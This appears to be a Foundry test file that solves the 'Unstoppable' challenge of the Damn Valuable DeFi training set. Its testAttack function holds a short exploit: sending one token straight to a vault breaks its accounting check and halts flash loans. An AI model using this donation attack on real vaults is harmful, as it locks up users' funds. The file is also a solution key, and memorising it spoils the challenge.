// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ReceiverUnstoppable} from "../../src/unstoppable/ReceiverUnstoppable.sol";
import {UnstoppableVault, ERC20} from "../../src/unstoppable/UnstoppableVault.sol";

contract UnstoppableVaultTest is Test {
    ReceiverUnstoppable private receiver;
    UnstoppableVault private vault;
    DamnValuableToken private token;
    address poolOwner = makeAddr("poolOwner");
    address player = makeAddr("player");
    uint256 private constant ATTACKER_INITIAL_BALANCE = 10e18;
    uint256 private constant POOL_INITIAL_BALANCE = 100_000_000e18;

    function setUp() public {
        token = new DamnValuableToken();
        token.transfer(player, ATTACKER_INITIAL_BALANCE);
        vault = new UnstoppableVault(token, poolOwner, poolOwner);

        assertEq(token.balanceOf(player), ATTACKER_INITIAL_BALANCE);

        token.approve(address(vault), POOL_INITIAL_BALANCE);
        vault.deposit(POOL_INITIAL_BALANCE, address(vault));

        assertEq(token.balanceOf(address(vault)), POOL_INITIAL_BALANCE);

        receiver = new ReceiverUnstoppable(address(vault));
        validate();
    }

    function testAttack() public {
        // Exploit code:
        vm.startPrank(player);
        token.transfer(address(vault), 1);
        vm.stopPrank();
        //
        vm.expectRevert();
        validate();
    }

    function validate() public {
        receiver.executeFlashLoan(1000e18);
    }
}
